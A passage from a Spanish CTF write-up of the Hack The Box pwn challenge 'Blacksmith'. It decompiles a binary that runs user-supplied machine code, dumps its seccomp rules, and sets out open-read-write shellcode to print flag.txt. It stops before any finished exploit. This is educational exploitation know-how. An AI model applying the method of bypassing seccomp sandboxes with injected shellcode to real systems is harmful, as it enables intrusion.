<!doctype html><html lang="es"><head><title>Blacksmith | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="description" content="Binario de 64 bits. Reglas `seccomp`. _Shellcode_ _open-read-write_"><meta name="image" content="https://7rocky.github.io/images/pwn.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="Binario de 64 bits. Reglas `seccomp`. _Shellcode_ _open-read-write_"><meta itemprop="keywords" content><meta itemprop="name" content="Blacksmith"><meta property="article:published_time" content><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:description" content="Binario de 64 bits. Reglas `seccomp`. _Shellcode_ _open-read-write_"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:locale" content="es_ES"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:title" content="Blacksmith"><meta property="og:type" content="website"><meta property="og:url" content="https://7rocky.github.io/ctf/htb-challenges/pwn/blacksmith/"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:card" content="Binario de 64 bits. Reglas `seccomp`. _Shellcode_ _open-read-write_"><meta name="twitter:description" content="Binario de 64 bits. Reglas `seccomp`. _Shellcode_ _open-read-write_"><meta name="twitter:image" content="https://7rocky.github.io/images/pwn.png"><meta name="twitter:title" content="Blacksmith"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/ctf/htb-challenges/pwn/blacksmith/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg>
</a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/ctf/htb-challenges/pwn/blacksmith/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- PWN</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/ctf/htb-challenges/pwn/blacksmith/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/ctf/htb-challenges/pwn/blacksmith/&amp;text=Blacksmith" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/ctf/htb-challenges/pwn/blacksmith/&amp;title=Blacksmith" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Blacksmith</h1><p class="mb4 f6 dib tracked">8 minutos de lectura</p></header><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>Se nos proporciona un binario de 64 bits llamado <code>blacksmith</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Arch:     amd64-64-little
RELRO:    <span class="code-dark-green">Full RELRO</span>
Stack:    <span class="code-dark-green">Canary found</span>
NX:       <span class="code-dark-red">NX disabled</span>
PIE:      <span class="code-dark-green">PIE enabled</span>
RWX:      <span class="code-dark-red">Has RWX segments</span>  
</code></pre></div><p>Si lo abrimos en Ghidra, veremos esta funci√≥n <code>main</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> length;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> in_FS_OFFSET;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> answer;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> option;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">message_1;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">message_2;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> canary;</span>
<span class="mtk1">  </span>
<span class="mtk1">  canary </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">setup</span><span class="mtk1">();</span>
<span class="mtk1">  message_1 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"You are worthy to carry this Divine Weapon and br</span><span class="mtk4">ing peace to our homeland!</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">;</span>
<span class="mtk1">  message_2 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"This in not a weapon! Do not try to mock me!</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">;</span>
<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Traveler, I need some materials to fuse in order </span><span class="mtk4">to create something really powerful!"</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Do you have the materials I need to craft the Ult</span><span class="mtk4">imate Weapon?</span><span class="mtk6">\n</span><span class="mtk4">1. Yes, everything is here! </span><span class="mtk6">\n</span><span class="mtk4">2. No, I did not manage to bring them all!</span><span class="mtk6">\n</span><span class="mtk4">&gt; "</span><span class="mtk1">);</span>  
<span class="mtk1">  </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%d</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">answer);</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (answer </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Farewell traveler! Come back when you have all th</span><span class="mtk4">e materials!"</span><span class="mtk1">);</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
<span class="mtk1">    </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">22</span><span class="mtk1">);</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">menu);</span>
<span class="mtk1">  </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%d</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">option);</span>
<span class="mtk1">  </span><span class="mtk8">sec</span><span class="mtk1">();</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (option </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk8">sword</span><span class="mtk1">();</span>
<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1"> (option </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk8">shield</span><span class="mtk1">();</span>
<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1"> (option </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">3</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk8">bow</span><span class="mtk1">();</span>
<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">    length </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">strlen</span><span class="mtk1">(message_2);</span>
<span class="mtk1">    </span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">, message_2, length);</span>
<span class="mtk3">                  /* WARNING: Subroutine does not </span><span class="mtk3">return */</span>
<span class="mtk1">    </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">105</span><span class="mtk1">);</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (canary </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">)) {</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
<span class="mtk1">    </span><span class="mtk8">__stack_chk_fail</span><span class="mtk1">();</span>
<span class="mtk1">  }</span>
<span class="mtk1">}</span>
</code></pre></div><p>Muestra un men√∫ con varias opciones:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./blacksmith</span>
Traveler, I need some materials to fuse in order to create something really powerful!
Do you have the materials I need to craft the Ultimate Weapon?
1. Yes, everything is here!
2. No, I did not manage to bring them all!
&gt; 2
Farewell traveler! Come back when you have all the materials!

<span class="code-cyan">$</span> <span class="code-dark-green">./blacksmith</span>
Traveler, I need some materials to fuse in order to create something really powerful!
Do you have the materials I need to craft the Ultimate Weapon?
1. Yes, everything is here!
2. No, I did not manage to bring them all!
&gt; 1
What do you want me to craft?
1. üó°
2. üõ°
3. üèπ
&gt; 1
This sword can cut through anything! The only thing is, that it is too heavy carry it..  
zsh: invalid system call  ./blacksmith

<span class="code-cyan">$</span> <span class="code-dark-green">./blacksmith</span>
Traveler, I need some materials to fuse in order to create something really powerful!
Do you have the materials I need to craft the Ultimate Weapon?
1. Yes, everything is here!
2. No, I did not manage to bring them all!
&gt; 1
What do you want me to craft?
1. üó°
2. üõ°
3. üèπ
&gt; 3
This bow's range is the best!
Too bad you do not have enough materials to craft some arrows too..
zsh: invalid system call  ./blacksmith

<span class="code-cyan">$</span> <span class="code-dark-green">./blacksmith</span>
Traveler, I need some materials to fuse in order to create something really powerful!
Do you have the materials I need to craft the Ultimate Weapon?
1. Yes, everything is here!
2. No, I did not manage to bring them all!
&gt; 1
What do you want me to craft?
1. üó°
2. üõ°
3. üèπ
&gt; 2
Excellent choice! This luminous shield is empowered with Sun's light! ‚òÄ
It will protect you from any attack and it can reflect enemies attacks back!
Do you like your new weapon?
&gt; yes
zsh: segmentation fault  ./blacksmith
</code></pre></div><p>La √∫nica opci√≥n en la que podemos introducir datos es <code>shield</code> (opci√≥n <code>2</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">shield</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> length;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> in_FS_OFFSET;</span>
<span class="mtk1">  undefined shellcode [</span><span class="mtk6">72</span><span class="mtk1">];</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> canary;</span>
<span class="mtk1">  </span>
<span class="mtk1">  canary </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">);</span>
<span class="mtk1">  length </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">strlen</span><span class="mtk1">(message);</span>
<span class="mtk1">  </span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">, message, length);</span>
<span class="mtk1">  length </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">strlen</span><span class="mtk1">(</span><span class="mtk4">"Do you like your new weapon?</span><span class="mtk6">\n</span><span class="mtk4">&gt; "</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk4">"Do you like your new weapon?</span><span class="mtk6">\n</span><span class="mtk4">&gt; "</span><span class="mtk1">, length);</span>
<span class="mtk1">  </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, shellcode, </span><span class="mtk6">63</span><span class="mtk1">);</span>
<span class="mtk1">  (</span><span class="mtk5">*</span><span class="mtk1">(code </span><span class="mtk5">*</span><span class="mtk1">) shellcode)();</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (canary </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">)) {</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>  
<span class="mtk1">    </span><span class="mtk8">__stack_chk_fail</span><span class="mtk1">();</span>
<span class="mtk1">  }</span>
<span class="mtk1">}</span>
</code></pre></div><p>B√°sicamente, tenemos la oportunidad de introducir instrucciones en c√≥digo m√°quina para que se ejecuten. Podemos introducir hasta 63 bytes. Sin embargo, estamos limitados por <code>sec</code>, que implementa reglas <code>seccomp</code> para permitir instrucciones <code>syscall</code> espec√≠ficas:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">sec</span><span class="mtk1">() {</span>
<span class="mtk1">  undefined8 rules;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> in_FS_OFFSET;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> canary;</span>
<span class="mtk1">  </span>
<span class="mtk1">  canary </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">prctl</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">26</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">prctl</span><span class="mtk1">(</span><span class="mtk6">4</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">);</span>
<span class="mtk1">  rules </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">seccomp_init</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">seccomp_rule_add</span><span class="mtk1">(rules, </span><span class="mtk5">0x</span><span class="mtk6">7fff0000</span><span class="mtk1">, </span><span class="mtk6">2</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">seccomp_rule_add</span><span class="mtk1">(rules, </span><span class="mtk5">0x</span><span class="mtk6">7fff0000</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">seccomp_rule_add</span><span class="mtk1">(rules, </span><span class="mtk5">0x</span><span class="mtk6">7fff0000</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">seccomp_rule_add</span><span class="mtk1">(rules, </span><span class="mtk5">0x</span><span class="mtk6">7fff0000</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">3c</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">seccomp_load</span><span class="mtk1">(rules);</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (canary </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">)) {</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>  
<span class="mtk1">    </span><span class="mtk8">__stack_chk_fail</span><span class="mtk1">();</span>
<span class="mtk1">  }</span>
<span class="mtk1">}</span>
</code></pre></div><p>Para enumerar estas reglas <code>seccomp</code>, podemos usar <a target="_blank" href="https://github.com/david942j/seccomp-tools"><code>seccomp-tools</code></a>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">seccomp-tools</span> dump <span class="mtku">./blacksmith</span>
Traveler, I need some materials to fuse in order to create something really powerful!  
Do you have the materials I need to craft the Ultimate Weapon?
1. Yes, everything is here!
2. No, I did not manage to bring them all!
&gt; 1
What do you want me to craft?
1. üó°
2. üõ°
3. üèπ
&gt; 2
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x08 0xc000003e  if (A != <span class="rb-cream">ARCH_X86_64</span>) goto 0010
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; <span class="rb-green">0x40000000</span>) goto 0005
 0004: 0x15 0x00 0x05 0xffffffff  if (A != <span class="rb-green">0xffffffff</span>) goto 0010
 0005: 0x15 0x03 0x00 0x00000000  if (A == <span class="rb-green">read</span>) goto 0009
 0006: 0x15 0x02 0x00 0x00000001  if (A == <span class="rb-green">write</span>) goto 0009
 0007: 0x15 0x01 0x00 0x00000002  if (A == <span class="rb-green">open</span>) goto 0009
 0008: 0x15 0x00 0x01 0x0000003c  if (A != <span class="rb-green">exit</span>) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x06 0x00 0x00 0x00000000  return KILL
</code></pre></div><p>Entonces, nos permiten usar <code>sys_read</code>, <code>sys_write</code>, <code>sys_open</code> y <code>sys_exit</code>. Existen varias p√°ginas web en las que se listan todas las instrucciones <code>syscall</code> de Linux x86_64 con los par√°metros y registros necesarios. Por ejemplo, <a target="_blank" href="https://syscalls64.paolostivanin.com/">esta</a>.</p><p>Con las instrucciones <code>syscall</code> permitidas, podemos abrir el archivo de la <em>flag</em> (<code>flag.txt</code>) con <code>sys_open</code>, leer el descriptor de archivo con <code>sys_read</code> y escribir su contenido al descriptor de archivo <code>stdout</code> con <code>sys_write</code>. Adicionalmente, podemos salir con <code>sys_exit</code>.</p><p>Entonces, <code>sys_openat</code> necesita la siguiente configuraci√≥n de registros:</p><ul><li><code>$rax = 2</code></li><li><code>$rdi</code> tiene un puntero al nombre del archivo</li><li><code>$rsi</code> tiene unas <em>flags</em></li><li><code>$rdx</code> tiene el modo de operaci√≥n (este se puede omitir)</li></ul><p>Espec√≠ficamente, podemos mirar en <a target="_blank" href="https://man7.org/linux/man-pages/man2/open.2.html">man7.org</a> y aprender m√°s sobre el significado de los par√°metros:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk5">const</span><span class="mtk1"> </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk9 mtki">pathname</span><span 